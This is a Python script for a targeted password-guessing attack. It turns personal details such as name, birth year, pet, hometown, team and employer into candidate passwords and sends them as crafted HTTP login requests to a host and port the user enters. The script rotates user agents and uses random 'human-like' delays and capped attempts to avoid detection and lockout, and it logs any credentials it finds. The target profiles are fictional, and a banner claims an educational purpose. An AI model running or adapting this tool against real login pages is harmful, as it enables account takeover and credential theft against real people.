#!/usr/bin/env python3

import socket
import time
import hashlib
import random
import itertools
from urllib.parse import urlencode

class KnownPasswordAttacker:
    def __init__(self, target_host="127.0.0.1", target_port=8081):
        self.target_host = target_host
        self.target_port = target_port
        self.target_info = {}
        self.generated_passwords = []
        self.success = False
        self.found_password = None
        self.attempts = 0
        self.start_time = None
        self.attack_log = []
        
        # Attack configuration
        self.delay_min = 0.5   # Slower, more human-like delays
        self.delay_max = 2.0   # To avoid detection
        self.max_attempts = 20  # Limited attempts to avoid lockout
        
        self.user_agents = [
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        ]
    
    def gather_target_intelligence(self, target_username):
        """Simulate OSINT gathering for target information"""
        print(f"[*] Gathering intelligence on target: {target_username}")
        print("[*] Simulating OSINT (Open Source Intelligence) collection...")
        
        # Predefined intelligence for simulation
        # In real attack, this would come from social media, public records, etc.
        target_profiles = {
            "john.smith": {
                "full_name": "John Smith",
                "first_name": "John",
                "last_name": "Smith",
                "birth_year": "1985",
                "birth_date": "15031985",
                "age": "39",
                "pet_name": "Buddy",
                "hometown": "Boston",
                "current_city": "Boston",
                "favorite_team": "Patriots",
                "company": "TechCorp",
                "job_title": "Developer",
                "interests": ["technology", "football", "gaming"],
                "common_numbers": ["15", "03", "1985", "85"]
            },
            "sarah.jones": {
                "full_name": "Sarah Jones",
                "first_name": "Sarah", 
                "last_name": "Jones",
                "birth_year": "1992",
                "birth_date": "22081992",
                "age": "32",
                "pet_name": "Luna",
                "hometown": "Seattle",
                "current_city": "Seattle",
                "favorite_team": "Seahawks",
                "company": "DataSoft",
                "job_title": "Analyst",
                "interests": ["music", "travel", "photography"],
                "common_numbers": ["22", "08", "1992", "92"]
            },
            "mike.johnson": {
                "full_name": "Michael Johnson",
                "first_name": "Michael",
                "last_name": "Johnson",
                "birth_year": "1978",
                "birth_date": "10121978",
                "age": "46",
                "pet_name": "Max",
                "hometown": "Chicago",
                "current_city": "Chicago",
                "favorite_team": "Bears",
                "company": "InfoTech",
                "job_title": "Manager",
                "interests": ["sports", "business", "cars"],
                "common_numbers": ["10", "12", "1978", "78"]
            },
            "anna.wilson": {
                "full_name": "Anna Wilson",
                "first_name": "Anna",
                "last_name": "Wilson", 
                "birth_year": "1990",
                "birth_date": "05071990",
                "age": "34",
                "pet_name": "Bella",
                "hometown": "Denver",
                "current_city": "Denver",
                "favorite_team": "Broncos",
                "company": "CloudTech",
                "job_title": "Engineer",
                "interests": ["hiking", "technology", "yoga"],
                "common_numbers": ["05", "07", "1990", "90"]
            },
            "david.brown": {
                "full_name": "David Brown",
                "first_name": "David",
                "last_name": "Brown",
                "birth_year": "1983",
                "birth_date": "18111983",
                "age": "41",
                "pet_name": "Rocky",
                "hometown": "Miami",
                "current_city": "Miami",
                "favorite_team": "Dolphins",
                "company": "SecureTech",
                "job_title": "Security Analyst",
                "interests": ["security", "beach", "fishing"],
                "common_numbers": ["18", "11", "1983", "83"]
            }
        }
        
        if target_username in target_profiles:
            self.target_info = target_profiles[target_username]
            print(f"[+] Intelligence gathered successfully!")
            print(f"    Full Name: {self.target_info['full_name']}")
            print(f"    Birth Year: {self.target_info['birth_year']}")
            print(f"    Pet Name: {self.target_info['pet_name']}")
            print(f"    Hometown: {self.target_info['hometown']}")
            print(f"    Favorite Team: {self.target_info['favorite_team']}")
            print(f"    Company: {self.target_info['company']}")
            return True
        else:
            print(f"[-] Limited intelligence available for {target_username}")
            print("[*] Using generic personal information patterns...")
            self.target_info = {
                "first_name": target_username.split('.')[0] if '.' in target_username else target_username,
                "birth_year": "1990",
                "common_numbers": ["123", "1990", "90", "2024"],
                "pet_name": "Buddy",
                "hometown": "Unknown"
            }
            return False
    
    def generate_personalized_passwords(self):
        """Generate password candidates based on gathered intelligence"""
        print(f"[*] Generating personalized password candidates...")
        
        passwords = []
        current_year = "2024"
        
        # Get target information
        first_name = self.target_info.get('first_name', '').capitalize()
        last_name = self.target_info.get('last_name', '').capitalize()
        birth_year = self.target_info.get('birth_year', '1990')
        birth_year_short = birth_year[-2:] if len(birth_year) >= 2 else birth_year
        pet_name = self.target_info.get('pet_name', '').capitalize()
        hometown = self.target_info.get('hometown', '').capitalize()
        favorite_team = self.target_info.get('favorite_team', '').capitalize()
        company = self.target_info.get('company', '').capitalize()
        
        # Common special characters and numbers
        special_chars = ['!', '@', '#', '$', '*']
        common_numbers = ['123', '1234', '12345']
        years = [current_year, birth_year, birth_year_short]
        
        # Pattern 1: FirstName + BirthYear + Special
        for special in special_chars:
            if first_name:
                passwords.append(f"{first_name}{birth_year}{special}")
                passwords.append(f"{first_name}{birth_year_short}{special}")
        
        # Pattern 2: PetName + CurrentYear
        if pet_name:
            passwords.append(f"{pet_name}{current_year}")
            passwords.append(f"{pet_name}{birth_year}")
            passwords.append(f"{pet_name}@{birth_year_short}")
        
        # Pattern 3: Hometown + BirthYear + Special
        if hometown != 'Unknown':
            for special in special_chars:
                passwords.append(f"{hometown}{birth_year}{special}")
                passwords.append(f"{hometown}{birth_year_short}{special}")
        
        # Pattern 4: FavoriteTeam + BirthYear
        if favorite_team:
            passwords.append(f"{favorite_team}{birth_year}")
            passwords.append(f"{favorite_team}{birth_year_short}")
        
        # Pattern 5: Company + BirthYear
        if company:
            passwords.append(f"{company}{birth_year}")
            passwords.append(f"{company}{birth_year_short}")
        
        # Pattern 6: FirstName + LastName + Numbers
        if first_name and last_name:
            for num in common_numbers:
                passwords.append(f"{first_name}{last_name}{num}")
            passwords.append(f"{first_name}{last_name}{birth_year_short}")
        
        # Pattern 7: Common variations
        if first_name:
            passwords.extend([
                f"{first_name}123",
                f"{first_name}1234",
                f"{first_name}{current_year}",
                f"{first_name.lower()}123",
                f"{first_name.lower()}{birth_year}"
            ])
        
        # Pattern 8: Pet + Special characters
        if pet_name:
            for special in special_chars:
                passwords.append(f"{pet_name}{special}")
                passwords.append(f"{pet_name}{birth_year_short}{special}")
        
        # Pattern 9: Birth date variations
        birth_date = self.target_info.get('birth_date', '')
        if birth_date:
            passwords.extend([
                birth_date,
                birth_date[:4],  # Day and month
                birth_date[-4:]  # Year
            ])
        
        # Pattern 10: Team + numbers
        if favorite_team:
            for num in common_numbers:
                passwords.append(f"{favorite_team}{num}")
        
        # Remove duplicates and empty passwords
        self.generated_passwords = list(set([p for p in passwords if p and len(p) >= 4]))
        
        print(f"[+] Generated {len(self.generated_passwords)} password candidates")
        print("[*] Top password candidates:")
        for i, pwd in enumerate(self.generated_passwords[:10]):
            print(f"    {i+1:2d}. {pwd}")
        if len(self.generated_passwords) > 10:
            print(f"    ... and {len(self.generated_passwords) - 10} more")
        
        return self.generated_passwords
    
    def craft_login_packet(self, username, password):
        """Craft HTTP POST request with stealth headers"""
        data = urlencode({
            'username': username,
            'password': password
        })
        
        # Use random user agent for stealth
        user_agent = random.choice(self.user_agents)
        
        # Generate session identifiers
        session_id = hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:16]
        
        request = f"""POST /login HTTP/1.1\r
Host: {self.target_host}:{self.target_port}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: {len(data)}\r
User-Agent: {user_agent}\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
Accept-Language: en-US,en;q=0.9\r
Accept-Encoding: gzip, deflate\r
Referer: http://{self.target_host}:{self.target_port}/\r
Origin: http://{self.target_host}:{self.target_port}\r
X-Requested-With: XMLHttpRequest\r
X-Session-ID: {session_id}\r
Connection: close\r
\r
{data}"""
        
        return request.encode()
    
    def send_attack_packet(self, username, password):
        """Send login attempt with detailed logging"""
        attempt_start = time.time()
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)
            sock.connect((self.target_host, self.target_port))
            
            packet = self.craft_login_packet(username, password)
            sock.send(packet)
            
            response = sock.recv(4096).decode('utf-8', errors='ignore')
            sock.close()
            
            self.attempts += 1
            response_time = time.time() - attempt_start
            
            # Analyze password pattern used
            pattern_used = self.analyze_password_pattern(password)
            
            # Log the attempt
            log_entry = {
                "attempt": self.attempts,
                "username": username,
                "password": password,
                "pattern": pattern_used,
                "response_time": response_time,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                "success": False
            }
            
            if "HTTP/1.1 200 OK" in response and "SUCCESS" in response:
                print(f"[+] SUCCESS! Password found: {password}")
                print(f"[+] Pattern used: {pattern_used}")
                print(f"[+] Response time: {response_time:.3f}s")
                log_entry["success"] = True
                self.success = True
                self.found_password = password
                self.attack_log.append(log_entry)
                return True
            elif "HTTP/1.1 429" in response:
                print(f"[!] Rate limited - attempt {self.attempts}: {password}")
                log_entry["rate_limited"] = True
            elif "HTTP/1.1 401" in response or "HTTP/1.1 403" in response:
                print(f"[-] Failed attempt {self.attempts}: {password} (Pattern: {pattern_used})")
            else:
                print(f"[?] Unexpected response for attempt {self.attempts}: {password}")
                
            self.attack_log.append(log_entry)
            return False
                
        except socket.timeout:
            print(f"[!] Timeout on attempt {self.attempts}: {password}")
            return False
        except ConnectionRefusedError:
            print(f"[!] Connection refused - target may be down")
            return False
        except Exception as e:
            print(f"[!] Connection error on attempt {self.attempts}: {e}")
            return False
    
    def analyze_password_pattern(self, password):
        """Analyze what pattern the password follows"""
        first_name = self.target_info.get('first_name', '').capitalize()
        birth_year = self.target_info.get('birth_year', '')
        birth_year_short = birth_year[-2:] if len(birth_year) >= 2 else ''
        pet_name = self.target_info.get('pet_name', '').capitalize()
        hometown = self.target_info.get('hometown', '').capitalize()
        favorite_team = self.target_info.get('favorite_team', '').capitalize()
        company = self.target_info.get('company', '').capitalize()
        
        patterns = []
        
        if first_name and first_name in password:
            patterns.append("FirstName")
        if birth_year and birth_year in password:
            patterns.append("BirthYear")
        elif birth_year_short and birth_year_short in password:
            patterns.append("BirthYear(short)")
        if pet_name and pet_name in password:
            patterns.append("PetName")
        if hometown != 'Unknown' and hometown in password:
            patterns.append("Hometown")
        if favorite_team and favorite_team in password:
            patterns.append("FavoriteTeam")
        if company and company in password:
            patterns.append("Company")
        if any(c in password for c in "!@#$*"):
            patterns.append("Special")
        if "2024" in password:
            patterns.append("CurrentYear")
        if any(num in password for num in ["123", "1234", "12345"]):
            patterns.append("CommonNumbers")
        
        return " + ".join(patterns) if patterns else "Unknown"
    
    def launch_attack(self, target_username):
        """Launch known password attack"""
        print(f"[*] Starting known password attack against {self.target_host}:{self.target_port}")
        print(f"[*] Target username: {target_username}")
        print(f"[*] Maximum attempts: {self.max_attempts}")
        print(f"[*] Delay range: {self.delay_min:.1f}s - {self.delay_max:.1f}s")
        print("[*] Attack initiated...\n")
        
        # Step 1: Gather intelligence
        intel_success = self.gather_target_intelligence(target_username)
        
        # Step 2: Generate personalized passwords
        passwords = self.generate_personalized_passwords()
        
        if not passwords:
            print("[-] No password candidates generated. Aborting attack.")
            return
        
        # Step 3: Limit attempts to avoid detection
        attack_passwords = passwords[:self.max_attempts]
        
        print(f"\n[*] Starting password attempts (Limited to {len(attack_passwords)} attempts)")
        print("-" * 60)
        
        self.start_time = time.time()
        
        for i, password in enumerate(attack_passwords):
            if self.success:
                break
            
            # Show progress
            progress = ((i + 1) / len(attack_passwords)) * 100
            print(f"[*] Progress: {progress:.1f}% ({i+1}/{len(attack_passwords)})")
                
            if self.send_attack_packet(target_username, password):
                break
            
            # Human-like delay to avoid detection
            if i < len(attack_passwords) - 1:  # Don't delay after last attempt
                delay = random.uniform(self.delay_min, self.delay_max)
                print(f"[*] Waiting {delay:.1f}s before next attempt...")
                time.sleep(delay)
        
        end_time = time.time()
        duration = end_time - self.start_time
        
        self.show_attack_summary(target_username, duration, intel_success)
    
    def show_attack_summary(self, target_username, duration, intel_success):
        """Display comprehensive attack summary"""
        print("\n" + "="*70)
        print("              KNOWN PASSWORD ATTACK SUMMARY")
        print("="*70)
        
        print(f"Target: {self.target_host}:{self.target_port}")
        print(f"Username: {target_username}")
        print(f"Intelligence gathering: {'Successful' if intel_success else 'Limited'}")
        print(f"Attack duration: {duration:.2f} seconds")
        print(f"Total attempts: {self.attempts}")
        print(f"Password candidates generated: {len(self.generated_passwords)}")
        
        if self.attempts > 0:
            avg_response_time = sum(log['response_time'] for log in self.attack_log if 'response_time' in log) / len(self.attack_log)
            attempts_per_minute = (self.attempts / duration) * 60 if duration > 0 else 0
            print(f"Average response time: {avg_response_time:.3f} seconds")
            print(f"Attempts per minute: {attempts_per_minute:.1f}")
        
        if self.success:
            print(f"\n[+] ATTACK SUCCESSFUL!")
            print(f"[+] Valid credentials found: {target_username}:{self.found_password}")
            
            # Find the successful attempt
            for log in self.attack_log:
                if log.get('success', False):
                    print(f"[+] Password cracked on attempt #{log['attempt']}")
                    print(f"[+] Pattern used: {log['pattern']}")
                    success_time = (log['attempt'] / self.attempts) * duration if self.attempts > 0 else 0
                    print(f"[+] Time to success: {success_time:.2f} seconds")
                    break
        else:
            print(f"\n[-] ATTACK FAILED")
            print(f"[-] No valid password found in generated candidates")
            print(f"[-] Consider gathering more intelligence or expanding pattern rules")
        
        # Show pattern analysis
        print(f"\nPattern Analysis:")
        pattern_stats = {}
        for log in self.attack_log:
            pattern = log.get('pattern', 'Unknown')
            pattern_stats[pattern] = pattern_stats.get(pattern, 0) + 1
        
        for pattern, count in pattern_stats.items():
            print(f"  {pattern}: {count} attempts")
        
        # Save attack log
        self.save_attack_log(target_username, intel_success)
    
    def save_attack_log(self, target_username, intel_success):
        """Save detailed attack log to file"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        log_filename = f"known_password_attack_log_{timestamp}.txt"
        
        try:
            with open(log_filename, 'w') as f:
                f.write(f"Known Password Attack Log\n")
                f.write(f"Target: {self.target_host}:{self.target_port}\n")
                f.write(f"Username: {target_username}\n")
                f.write(f"Intelligence Gathering: {'Successful' if intel_success else 'Limited'}\n")
                f.write(f"Attack started: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(self.start_time))}\n")
                f.write(f"Total attempts: {self.attempts}\n")
                f.write(f"Password candidates generated: {len(self.generated_passwords)}\n")
                f.write(f"Success: {'Yes' if self.success else 'No'}\n")
                if self.success:
                    f.write(f"Found password: {self.found_password}\n")
                
                f.write(f"\n" + "="*50 + "\n")
                f.write(f"Target Intelligence:\n")
                f.write(f"="*50 + "\n")
                for key, value in self.target_info.items():
                    f.write(f"{key}: {value}\n")
                
                f.write(f"\n" + "="*50 + "\n")
                f.write(f"Generated Password Candidates:\n")
                f.write(f"="*50 + "\n")
                for i, pwd in enumerate(self.generated_passwords, 1):
                    f.write(f"{i:2d}. {pwd}\n")
                
                f.write(f"\n" + "="*50 + "\n")
                f.write(f"Detailed Attempt Log:\n")
                f.write(f"="*50 + "\n")
                
                for log in self.attack_log:
                    status = "SUCCESS" if log.get('success', False) else "FAILED"
                    f.write(f"[{log['timestamp']}] Attempt #{log['attempt']}: {log['username']}:{log['password']}")
                    f.write(f" - {status} (Pattern: {log['pattern']})")
                    if 'response_time' in log:
                        f.write(f" (Response: {log['response_time']:.3f}s)")
                    if log.get('rate_limited', False):
                        f.write(" [RATE LIMITED]")
                    f.write("\n")
            
            print(f"\n[*] Attack log saved to: {log_filename}")
            
        except Exception as e:
            print(f"[!] Failed to save attack log: {e}")

def main():
    print("="*70)
    print("     KNOWN PASSWORD ATTACK SIMULATION - ATTACKER")
    print("="*70)
    print("Educational/Defensive Security Purposes Only")
    print("Uses OSINT and personal information to generate targeted passwords")
    print("="*70)
    
    # Get target information
    target_host = input("\nEnter target host (default: 127.0.0.1): ").strip() or "127.0.0.1"
    target_port = int(input("Enter target port (default: 8081): ").strip() or "8081")
    target_user = input("Enter target username: ").strip()
    
    if not target_user:
        print("[!] Target username is required for known password attack")
        return
    
    # Attack configuration
    print(f"\n[*] Attack Configuration:")
    max_attempts = input("Maximum attempts (default: 20): ").strip()
    max_attempts = int(max_attempts) if max_attempts.isdigit() else 20
    
    delay_min = input("Minimum delay between attempts in seconds (default: 0.5): ").strip()
    delay_min = float(delay_min) if delay_min else 0.5
    
    delay_max = input("Maximum delay between attempts in seconds (default: 2.0): ").strip()
    delay_max = float(delay_max) if delay_max else 2.0
    
    # Create attacker instance
    attacker = KnownPasswordAttacker(target_host, target_port)
    attacker.max_attempts = max_attempts
    attacker.delay_min = delay_min
    attacker.delay_max = delay_max
    
    print(f"\n[*] Target: {target_host}:{target_port}")
    print(f"[*] Username: {target_user}")
    print(f"[*] Max attempts: {max_attempts}")
    print(f"[*] Delay range: {delay_min:.1f}s - {delay_max:.1f}s")
    
    input("\nPress Enter to start intelligence gathering and attack...")
    
    try:
        attacker.launch_attack(target_user)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    except Exception as e:
        print(f"\n[!] Attack failed with error: {e}")

if __name__ == "__main__":
    main()